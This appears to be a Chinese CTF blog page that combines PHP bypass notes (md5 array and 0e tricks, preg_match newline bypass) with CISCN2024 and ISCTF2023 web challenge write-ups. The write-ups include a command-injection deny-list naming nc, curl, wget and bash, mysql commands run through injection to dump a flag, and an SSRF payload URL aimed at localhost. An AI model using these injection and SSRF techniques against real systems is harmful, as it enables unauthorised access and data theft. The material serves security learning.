<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于这种题，我们可以采用数组绕过，因为md5对数组编码后返回为空，我们只需要让数组名不同就行</p>
<p>特别地，若题目变成这样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于弱比较的特性，我们可以通过爆破来传入相应的值。之前有个例子提到关于科学计数法，e是个比较特殊的字母，我们可以利用0e来进行绕过（毕竟0乘任何数都是0）</p>
<p>根据这个，我们可以查询哪些数值或字符串能够在md5编码后开头为0e</p>
<p>:::info</p>
<p>可以思考一下[0-9]e后如果先接字符后数字或者先数字再字符时会输出什么</p>
<p>:::</p>
<h1 id="3-preg-match"><a href="#3-preg-match" class="headerlink" title="3.preg_match"></a>3.preg_match</h1><p>preg_match用于执行匹配正则表达式，说白了就是查找选定字符串中有没有能匹配得上正则表达式部分的。这个只需知道如何看出匹配哪些字符就行，根据条件来写传入的数据</p>
<p>php文档给出的匹配模式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[abc]      单个字符：a、b 或 c</span><br><span class="line">[^abc]     任何单个字符，但不是 a、b 或 c</span><br><span class="line">[a-z]      范围 a-z 内的任何单个字符</span><br><span class="line">[a-zA-Z]   范围 a-z 或 A-Z 内的任何单个字符</span><br><span class="line">^          行首</span><br><span class="line">$          行尾</span><br><span class="line">\A         字符串的开头</span><br><span class="line">\z         字符串的结尾</span><br><span class="line">.          任意单个字符</span><br><span class="line">\s         任意空白字符</span><br><span class="line">\S         任意非空白字符</span><br><span class="line">\d         任意数字</span><br><span class="line">\D         任意非数字</span><br><span class="line">\w         任意单词字符（字母、数字、下划线）</span><br><span class="line">\W         任意非单词字符</span><br><span class="line">\b         任意单词边界字符</span><br><span class="line">(...)      捕获括号内的所有内容</span><br><span class="line">(a|b)      a 或 b</span><br><span class="line">a?         零个或一个 a</span><br><span class="line">a*         零个或多个 a</span><br><span class="line">a+         一个或多个 a</span><br><span class="line">a&#123;3&#125;       正好 3 个 a</span><br><span class="line">a&#123;3,&#125;      3 个或更多 a</span><br><span class="line">a&#123;3,6&#125;     3 到 6 个 a</span><br><span class="line"></span><br><span class="line">i 不区分大小写</span><br><span class="line">m 使点号匹配换行符</span><br><span class="line">x 忽略正则表达式中的空白</span><br><span class="line">o 仅进行一次 #&#123;...&#125; 替换</span><br></pre></td></tr></table></figure>

<p>例如<code>preg_match(/[a-z][A-Z][0-9]/, $a)</code>表示的是查看$a中是否含有字母和数字，其中字母包含大小写</p>
<p>在审计这种代码时，需要记住匹配模式中每一个正则表达式表示的是什么</p>
<p>这里拿一个ctfshow的题目出来说说</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一层匹配是查询所有行中是否至少有一行是php，第二层则是查询第一行中是否只有php</p>
<p>在/i模式下只能匹配一行，但是加了/m后，php就会解析每一行</p>
<p>因此可以传入cmd=php%0a123，其中%0a为换行符的url编码</p>
<p>:::info</p>
<p>可能有同学会不理解第一次和第二次都能过，因为在/im模式下，php会将%0a识别为换行符，因此我们穿的一行数据在经过解析之后实际上是两行数据；而在/i模式下，%0a只是一个普通的字符串而已</p>
<p>之前也提过，<code>preg_match(&#39;/^php$/im&#39;, $a)</code>是检查某一行中的从头到尾是否是php，这就意味着你有一行只能是php</p>
<p>:::</p>
<h2 id="额外补充一个"><a href="#额外补充一个" class="headerlink" title="额外补充一个"></a>额外补充一个</h2><p><code>strpos</code>用于查找某个字符或某个字符串在某个变量中第一次出现的位置，当匹配字符串时，返回变量中匹配的字符串的第一个字符的位置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;010101&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;0&#x27;</span>)); <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;1&#x27;</span>)); <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;2&#x27;</span>)); <span class="comment">// 无输出</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;010&#x27;</span>)); <span class="comment">// 0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="4-highlight-file"><a href="#4-highlight-file" class="headerlink" title="4.highlight_file"></a>4.highlight_file</h1><p>官方文档给出的用法：<code>highlight_file([string] $filename, [bool] $return = false): [string]|[bool]</code></p>
<p>我们用到的highlight_file一般用于高亮一个文件（展示一个文件的内容并将对应的代码块进行高亮），因此bool类型一般不会用到</p>
<p>而$filename传入的实际上是文件的地址</p>
<h1 id="5-file-put-contents"><a href="#5-file-put-contents" class="headerlink" title="5.file_put_contents"></a>5.file_put_contents</h1><p>php官方文档：<code>file_put_contents(</code><br>  <code>[string] $filename,
  [mixed] $data,</code><br>  <code>[int] $flags = 0,
  [?][resource] $context = **null**</code><br>`): [int]|[false]``</p>
<p>其中主要的是filename，需要对内容进行写入的文件（传的是文件名而非地址，注意和其他函数的区别），data就是写入的内容</p>
<p>file_put_contents用于向一个文件里面写内容，针对的是当前目录下的文件，如果当前目录下存在目标文件名，则将该文件进行覆盖重写，反之则创建一个新文件并将内容写入其中</p>
<h1 id="6-call-user-func"><a href="#6-call-user-func" class="headerlink" title="6.call_user_func"></a>6.call_user_func</h1><p>php官方文档：</p>
<p><code>call_user_func([callable] $callback, [mixed] ...$args): [mixed]</code></p>
<p>call_user_func把第一个参数作为回调函数调用</p>
<p>:::info no-icon</p>
<p>回调：一个过程，将某个函数作为参数放到另外一个函数中，当另外一个函数执行完后，再转过头来执行这个函数</p>
<p>而回调函数实际上是一个参数</p>
<p>:::</p>
<p>第一个传递的是php的函数，例如eval，hex2bin等</p>
<p>第二个传递的是回调函数的参数</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-06-04  <a class="commentCountImg" href="/2024/06/04/Webbbb/SSTI/ssti-First/#comment-container"><span class="display-none-class">92a10ff952c52e058e61e8a2365f4fd6</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="92a10ff952c52e058e61e8a2365f4fd6">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>几秒  <i class="fas fa-pencil-alt"> </i>0.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/06/04/Webbbb/SSTI/ssti-First/">ssti-First</a></h1><div class="content"><p>最近在回顾自己所学时发现有很多地方还是没有学通，比如ssti，xss等，这里就先学一下ssti吧</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-05-27  <a class="commentCountImg" href="/2024/05/27/competition/202405/ciscn2024/#comment-container"><span class="display-none-class">35383f3de54840a9c6b2feb53b778adb</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="35383f3de54840a9c6b2feb53b778adb">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>6 分钟  <i class="fas fa-pencil-alt"> </i>0.9 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/05/27/competition/202405/ciscn2024/">ciscn2024</a></h1><div class="content"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题把flag放到数据库有点没想到</p>
<p>本题开始通过<code>escapeshellcmd</code>直接把符号过滤了，加上一大串命令的waf显得对这道题有点力不从心</p>
<p>有一个思路是可以利用php命令将后面输入语句进行解析并执行，这里就涉及到对linux命令的掌握程度了捏，当然了也可以用paste和rev</p>
<p>paste帮助文件如下：</p>
<p><img src="./ciscn2024.assets/image-20240527102554466.png" alt="image-20240527102554466"></p>
<p>rev帮助文件如下：</p>
<p><img src="./ciscn2024.assets/image-20240527102653007.png" alt="image-20240527102653007"></p>
<p>rev就是把文件里的每一行进行倒序输出：</p>
<p><img src="./ciscn2024.assets/image-20240527102739315.png" alt="image-20240527102739315"></p>
<p>这里用paste</p>
<p>直接查看/etc/passwd</p>
<p><img src="./ciscn2024.assets/image-20240527102930670.png" alt="image-20240527102930670"></p>
<p>有mysql的记录，可以试试能不能运行mysql命令</p>
<p><img src="./ciscn2024.assets/image-20240527103017505.png" alt="image-20240527103017505"></p>
<p>然后开始rce（原本想反弹shell的，但是不知道为什么就是出不来，只能rce了）</p>
<p>这里用到截断字符串的命令（我先列出sql的查询语句）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo `mysql -uroot -proot -e &quot;show databases&quot;`;</span><br><span class="line">echo `mysql -uroot -proot -e &quot;use PHP_CMS;show tables&quot;`;</span><br><span class="line">echo `mysql -uroot -proot -e &quot;use PHP_CMS;SELECT * FROM F1ag_Se3Re7&quot;`;</span><br></pre></td></tr></table></figure>

<p><img src="./ciscn2024.assets/image-20240527112314826.png" alt="image-20240527112314826"></p>
<p><img src="./ciscn2024.assets/image-20240527112434099.png" alt="image-20240527112434099"></p>
<p><img src="./ciscn2024.assets/image-20240527112603159.png" alt="image-20240527112603159"></p>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>之前扫过一遍，有敏感目录flag.php和Readme.txt，提示说flag.php如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>返回的是真实的ip地址，没法伪造，但是存在SSRF</p>
<p>查看Readme.txt</p>
<p><img src="./ciscn2024.assets/image-20240527113133391.png" alt="image-20240527113133391"></p>
<p>有乱码，用wget获取</p>
<p><img src="./ciscn2024.assets/image-20240527113121934.png" alt="image-20240527113121934"></p>
<p>下载cms后看看它的漏洞报告</p>
<p>有关SSRF的是这个：</p>
<p><img src="./ciscn2024.assets/image-20240527113746916.png" alt="image-20240527113746916"></p>
<p>顺着源码查找一下qrcode，最终可定位到<code>/dayrui/Fcms/Control/Api/Api.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">        <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">        <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">        <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成二维码图片</span></span><br><span class="line">        <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!IS_DEV &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&#x27;二维码生成失败&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;https://&#x27;</span>) !== <span class="literal">false</span></span><br><span class="line">                    &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;/&#x27;</span>) !== <span class="literal">false</span></span><br><span class="line">                    &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;图片地址不规范&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$img</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$thumb</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$img</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;此图片不是一张可用的图片&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$code</span> = <span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$code</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;图片参数不规范&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">                <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">                <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">                <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">                <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">                <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">                <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">                <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">                <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, (<span class="keyword">int</span>)<span class="variable">$from_width</span>, (<span class="keyword">int</span>)<span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, (<span class="keyword">int</span>)<span class="variable">$logo_qr_width</span>, (<span class="keyword">int</span>)<span class="variable">$logo_qr_height</span>, (<span class="keyword">int</span>)<span class="variable">$logo_width</span>, (<span class="keyword">int</span>)<span class="variable">$logo_height</span>);</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>分析之后发现$thumb可控，因为这里的相关信息是填的图片地址</p>
<p>注意到<code>$code = dr_catcher_data($thumb);</code></p>
<p>定位到<code>/dayrui/Fcms/Control/Core/Helper.php</code></p>
<p><img src="./ciscn2024.assets/image-20240527120045229.png" alt="image-20240527120045229"></p>
<p><img src="./ciscn2024.assets/image-20240527120018968.png" alt="image-20240527120018968"></p>
<p>根据api.php构造payload：</p>
<p><code>index.php?c=api&amp;s=api&amp;m=qrcode&amp;text=111&amp;size=1024&amp;level=1&amp;thumb=http://127.0.0.1/flag.php</code></p>
<p>（为什么会这样构造可以看看Fcms下的init.php,然后再结合Api.php看看）</p>
<p><img src="./ciscn2024.assets/image-20240527130138931.png" alt="image-20240527130138931"></p>
<p>但是没有输出，只有一个二维码，扫出来只有text的内容</p>
<p>尝试使用302跳转来反弹shell</p>
<p>（先放着，我弄了好久都没弄出来）</p>
<p><img src="./ciscn2024.assets/image-20240731131025356.png" alt="image-20240731131025356"></p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-05-16  <a class="commentCountImg" href="/2024/05/16/competition/Others/ISCTF2023/#comment-container"><span class="display-none-class">a78b2675b5948ff8968ce39e344fe6bc</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="a78b2675b5948ff8968ce39e344fe6bc">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>11 分钟  <i class="fas fa-pencil-alt"> </i>1.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/05/16/competition/Others/ISCTF2023/">ISCTF2023</a></h1><div class="content"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="绕进你心里"><a href="#绕进你心里" class="headerlink" title="绕进你心里"></a>绕进你心里</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;pan_gu&#x27;</span>];</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;zhurong&#x27;</span>];</span><br><span class="line"><span class="variable">$lida1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hongmeng&#x27;</span>];</span><br><span class="line"><span class="variable">$lida2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shennong&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$lida1</span> !== <span class="variable">$lida2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$lida1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$lida2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5绕过了!&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;你干嘛?哎哟!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再想想!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">&#x27;2023ISCTF&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;就差一点点啦!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>md5的绕过不多说，数组直接奉上；<code>intval()</code>的绕过也可以用数组，它在处理数组时，若数组为空，则返回0，否则返回1</p>
<p><img src="./ISCTF2023.assets/image-20240516123445917.png" alt="image-20240516123445917"></p>
